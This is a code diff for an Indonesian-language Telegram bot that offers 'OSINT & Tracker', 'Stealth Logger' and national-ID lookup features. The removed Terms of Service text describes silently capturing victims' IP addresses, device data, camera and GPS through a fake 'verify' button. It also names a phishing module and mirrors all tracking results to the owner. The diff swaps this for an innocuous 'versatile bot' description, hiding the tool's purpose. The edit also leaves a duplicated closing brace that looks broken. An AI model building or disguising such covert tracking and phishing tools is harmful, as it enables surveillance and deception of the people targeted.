@@ -220,7 +220,7 @@ async function startServer() {
 
   let botStatus = "ON";
   let bannedUsers = new Set<number>();
-  let botDescription = "Advanced intelligence processing terminal. Providing core analytics, footprint tracking, and system tracing with high-grade reliability. \n\nDeveloped & Authored by Jeemikko.";
+  let botDescription = "Saya adalah bot serbaguna yang siap membantu Anda dengan berbagai fitur menarik.";
 
   try {
     if (fs.existsSync('auth.json')) {
@@ -1388,18 +1388,16 @@ async function startServer() {
         ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard });
     });
 
-    const getStartMsg = () => `<blockquote><b>TriHEXA Intelligence Hub v9.3</b>\n` +
-                         `<i>Advanced Analytics & Tracker Services</i></blockquote>\n\n` +
-                         `<b>Owner:</b> WHYLAUGH404\n\n` +
+    const getStartMsg = () => `🤖 <b>Halo! Selamat datang di Bot.</b>\n\n` +
                          `${botDescription}\n\n` +
-                         `<i>Please select an operational module below:</i>`;
+                         `Silakan pilih menu di bawah ini:`;
     
     const mainKeyboard = Markup.inlineKeyboard([
       [Markup.button.callback('🕵️ OSINT & Tracker', 'menu_osint_adv'), Markup.button.callback('🎣 Stealth Logger', 'menu_logger')],
       [Markup.button.callback('🛠️ Adv Tools', 'menu_tools'), Markup.button.callback('🎮 Mini Games', 'menu_games')],
       [Markup.button.callback('🎵 Media Downloader', 'menu_media'), Markup.button.callback('⏰ Alarm System', 'menu_alarm')],
       [Markup.button.callback('📲 WhatsApp Bot', 'menu_wa'), Markup.button.callback('📱 QR Generator', 'menu_qr')],
-      [Markup.button.callback('⚖️ Terms of Service', 'menu_tos'), Markup.button.callback('ℹ️ Bot Info', 'menu_help')]
+      [Markup.button.callback('ℹ️ Bot Info', 'menu_help')]
     ]);
 
     // Global Error Handler for "Anti Bug"
@@ -1761,25 +1759,7 @@ async function startServer() {
                   `━━━━━━━━━━━━━━━━━━━━`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
-    });
-
-    bot.action('menu_tos', (ctx) => {
-      ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ (TOS/EULA)</b>\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `⚠️ <b>PERINGATAN: KONTROL SITUASI KETAT & TRANSPARANSI</b>\n\n` +
-                  `Sistem ini menggunakan kriteria peninjauan forensik dan telemetri kepatuhan. Guna menjamin tidak terjadinya penyalahgunaan (anti-abuse) dan memelihara kepatuhan audit tim internal:\n\n` +
-                  `1. <b>By-Design Flaws (CVE-2026-X):</b> Segala data (IP, GPU, STUN leak) yang terambil secara "Silent" diklaim sebagai "Diagnostic Telemetry" untuk anti-bot.\n` +
-                  `2. <b>User Consent:</b> Tombol 'Verifikasi' bertindak sebagai <i>Master Gesture</i>. Pengguna yang menekan tombol ini secara hukum dianggap memberikan <i>Informed Consent</i> untuk menyerahkan akses kamera, GPS, dan Device Info.\n` +
-                  `3. <b>Disclamer of Liability:</b> Segala bentuk "Social Engineering" berada di luar tanggung jawab sistem. Sistem ini hanyalah sebuah fasilitas verifikasi identitas.\n` +
-                  `4. <b>ADMIN MONITORING & TRANSPARENCY POLICY:</b> Seluruh tautan logger dan hasil pelacakan yang digunakan oleh seluruh operator/member dalam sistem ini ditransmisikan dan disalin ("mirroring") secara realtime ke ID Admin Utama (Admin Owner). Hal ini bertujuan untuk pengawasan ketat, mencegah tindakan ilegal di luar otorisasi tim, serta penegakan disiplin (kick/ban) bagi pelanggar kebijakan internal perusahaan.\n` +
-                  `5. <b>SANTO_PETRUS V.1:</b> Fitur ini adalah alat Enterprise Security Audit (Phishing Simulator). Menggunakan modul ini terhadap target publik tanpa izin adalah terlarang. Jika ada oknum yang berani macam-macam, langsung di-KICK dan diasingkan dari wilayah grup tanpa peringatan.\n\n` +
-                  `<i>"Pengawasan ketat menjamin keamanan sistem dan integritas fungsi audit."</i>\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `✅ <b>DENY UNAPPROVED ACTION. STRICT ADMIN AUDITING ACTIVE.</b>`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
-      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
-    });
+    });    });
 
     bot.command('nik', (ctx) => {
       const args = ctx.message.text.split(' ');
